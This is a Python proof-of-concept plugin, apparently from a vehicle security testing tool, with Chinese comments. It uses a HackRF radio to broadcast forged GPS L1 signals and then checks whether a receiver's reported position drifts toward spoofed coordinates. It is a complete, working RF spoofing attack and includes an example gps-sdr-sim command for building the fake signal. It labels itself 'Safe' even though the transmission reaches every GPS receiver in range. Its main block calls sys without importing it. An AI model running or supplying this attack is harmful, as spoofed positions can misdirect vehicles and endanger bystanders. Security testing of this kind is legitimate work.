"""
PoC Name: GPS Signal Spoofing
Identifier: CWE-345
Component: Multiple
Category: Advanced
Severity: High
CVSS: 7.0
Description: 使用HackRF广播伪造GPS L1信号
Prerequisites: 需安装 hackrf 驱动组件，连接 HackRF SDR 硬件，并预先使用 gps-sdr-sim 生成 gpssim.bin 信号源文件。
Usage: python3 03_GPS_Spoofing.py [frequency_hz]
"""
import os
import math
import time
import subprocess
import shutil
from iv_plugin_base import IVIVulnerabilityPlugin

class GPSSpoofingPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-ADV-003"
    meta_poc_name = "GPS Spoofing"
    meta_cve_id = "CWE-345"
    meta_severity = "High"
    meta_protocol = "rf"
    meta_target_os = ["all"]
    meta_required_params = ["frequency"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.frequency = str(self.params.get("frequency", "")).strip()
        self.observer_file = self.params.get("observer_file")
        self.expected_lat = self.params.get("expected_lat")
        self.expected_lon = self.params.get("expected_lon")
        self.min_drift_meters = float(self.params.get("min_drift_meters", 100))
        # 1. 检查是否存在hackrf工具
        if not shutil.which("hackrf_transfer"):
            self.logger.error("未找到 hackrf_transfer 工具。请先安装 HackRF 软件包 (如 sudo apt-get install hackrf)。")
            return False
            
        # 2. 预处理频率参数
        if not self.frequency:
            self.frequency = "1575420000" # 缺省使用 GPS L1 频段 1575.42 MHz (单位Hz)
        else:
            if "MHz" in self.frequency:
                freq = self.frequency.replace("MHz", "").strip()
                try:
                    self.frequency = str(int(float(freq) * 1000000))
                except ValueError:
                    self.frequency = "1575420000"
        return True

    def _parse_latest_nmea_position(self, path):
        if not path or not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8", errors="ignore") as handle:
            lines = handle.read().splitlines()
        for line in reversed(lines):
            if line.startswith("$GPGGA") or line.startswith("$GNGGA"):
                parts = line.split(",")
                if len(parts) > 5 and parts[2] and parts[4]:
                    lat = self._nmea_to_decimal(parts[2], parts[3])
                    lon = self._nmea_to_decimal(parts[4], parts[5])
                    if lat is not None and lon is not None:
                        return lat, lon
            if line.startswith("$GPRMC") or line.startswith("$GNRMC"):
                parts = line.split(",")
                if len(parts) > 6 and parts[3] and parts[5]:
                    lat = self._nmea_to_decimal(parts[3], parts[4])
                    lon = self._nmea_to_decimal(parts[5], parts[6])
                    if lat is not None and lon is not None:
                        return lat, lon
        return None

    def _nmea_to_decimal(self, value, hemisphere):
        try:
            raw = float(value)
        except (TypeError, ValueError):
            return None
        degrees = int(raw / 100)
        minutes = raw - degrees * 100
        decimal = degrees + minutes / 60.0
        if hemisphere in {"S", "W"}:
            decimal *= -1
        return decimal

    def _distance_meters(self, lat1, lon1, lat2, lon2):
        radius = 6371000.0
        phi1 = math.radians(lat1)
        phi2 = math.radians(lat2)
        dphi = math.radians(lat2 - lat1)
        dlambda = math.radians(lon2 - lon1)
        a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlambda / 2) ** 2
        return 2 * radius * math.atan2(math.sqrt(a), math.sqrt(1 - a))

    def exploit(self):
        self.logger.info("准备执行 GPS 欺骗攻击 (HackRF Pcap/Bin Replay)...")
        
        # 3. 检查是否有预生成的基带信号文件
        bin_file = (
            self.params.get("gpssim_path")
            or self.params.get("baseband_file")
            or os.environ.get("AUTOSEC_GPS_BASEBAND")
            or "gpssim.bin"
        )
        if not os.path.exists(bin_file):
            self.logger.warning(f"未找到预生成的 GPS 基带信号文件：{bin_file}")
            self.logger.warning(">>> 提示：您可以使用 gps-sdr-sim 开源工具预先生成此文件。")
            self.logger.warning(">>> 示例：gps-sdr-sim -e brdc3540.14n -l 39.9042,116.4074,100 -b 8")
            return {
                "status": "error",
                "vulnerable": False,
                "details": f"Missing payload baseband file: {bin_file}"
            }
            
        self.logger.info(f"Target Frequency: {self.frequency} Hz")
        self.logger.info("正在尝试连接 HackRF SDR 硬件设备并开始发射伪造信号...")
        
        # 构建 HackRF 发射命令
        cmd = [
            "hackrf_transfer",
            "-t", bin_file,
            "-f", self.frequency,
            "-s", "2600000",   # Sample rate for GPS sim is typically 2.6 Msps
            "-a", "1",         # Amp Enable
            "-x", "20"         # TX VGA Gain (0-47)
        ]
        
        try:
            before_position = self._parse_latest_nmea_position(self.observer_file)
            self.logger.info(f"执行命令: {' '.join(cmd)}")
            
            # 使用 Popen 启动进程，以便中途能够主动终止
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # 等待 2 秒钟，检查进程是否因为找不到设备（如未插 USB 设备）而闪退
            time.sleep(2)
            if process.poll() is not None:
                stdout, stderr = process.communicate()
                out = stdout + stderr
                self.logger.error("HackRF 进程过早退出，执行失败！排查日志：")
                for line in out.splitlines():
                    self.logger.error(f"  {line}")
                    
                if "No HackRF boards found" in out or "not found" in out:
                    return {
                        "status": "error",
                        "vulnerable": False,
                        "details": "Hardware Error: HackRF SDR device is not connected or recognized via USB."
                    }
                return {
                    "status": "error",
                    "vulnerable": False,
                    "details": "HackRF transmission process failed to start."
                }
                
            # 若成功启动，我们将持续发射 15 秒作为 PoC 验证
            self.logger.info(">> HackRF 正在广播伪装出的 GPS 空间定位信号，将持续 15 秒钟...")
            for i in range(15):
                if process.poll() is not None:
                    break
                self.logger.info(f"Transmitting GPS signal... ({i+1}/15 sec)")
                time.sleep(1)
                
            # 时间到，安全终止发射以防持久干扰
            self.logger.info("PoC 演示时限结束，正在停止无线电发射...")
            process.terminate()
            process.wait(timeout=3)
            after_position = self._parse_latest_nmea_position(self.observer_file)
            
            self.logger.info("[SUCCESS] \u6210\u529f\u5b8c\u6210 GPS \u4f2a\u9020\u4fe1\u53f7\u7684\u5e7f\u64ad\u3002")
            self.logger.info("\u82e5\u76ee\u6807\u8f66\u8f86(ADAS\u6a21\u5757/\u5bfc\u822a\u6a21\u5757)\u7f3a\u4e4f\u4fe1\u53f7DRM/\u5bc6\u7801\u5b66\u6821\u9a8c(OSNMA)\uff0c\u5176\u4f4d\u7f6e\u5750\u6807\u53ef\u80fd\u5df2\u88ab\u7be1\u6539\u3002")
            
            if (
                before_position
                and after_position
                and self.expected_lat is not None
                and self.expected_lon is not None
            ):
                expected_lat = float(self.expected_lat)
                expected_lon = float(self.expected_lon)
                pre_drift = self._distance_meters(before_position[0], before_position[1], expected_lat, expected_lon)
                post_drift = self._distance_meters(after_position[0], after_position[1], expected_lat, expected_lon)
                if post_drift + 1 < pre_drift and abs(post_drift - pre_drift) >= self.min_drift_meters:
                    return {
                        "status": "success",
                        "vulnerable": True,
                        "details": (
                            f"Observer NMEA stream moved {abs(post_drift - pre_drift):.1f}m toward spoofed coordinates "
                            f"({expected_lat},{expected_lon}) during transmission."
                        ),
                    }
                return {
                    "status": "success",
                    "vulnerable": False,
                    "details": (
                        f"Transmission succeeded but observer drift was insufficient for confirmation "
                        f"(pre={pre_drift:.1f}m post={post_drift:.1f}m)."
                    ),
                }

            return {
                "status": "success",
                "vulnerable": False,
                "details": "Transmission verified, but no observer_file+expected_lat/expected_lon evidence was provided to confirm target position drift."
            }
                
        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "vulnerable": False,
                "details": str(e)
            }

if __name__ == "__main__":
    params = {"target_ip": "N/A"}
    if len(sys.argv) >= 2:
        params["frequency"] = sys.argv[1]
    plugin = GPSSpoofingPlugin(params)
    plugin.run_verify()
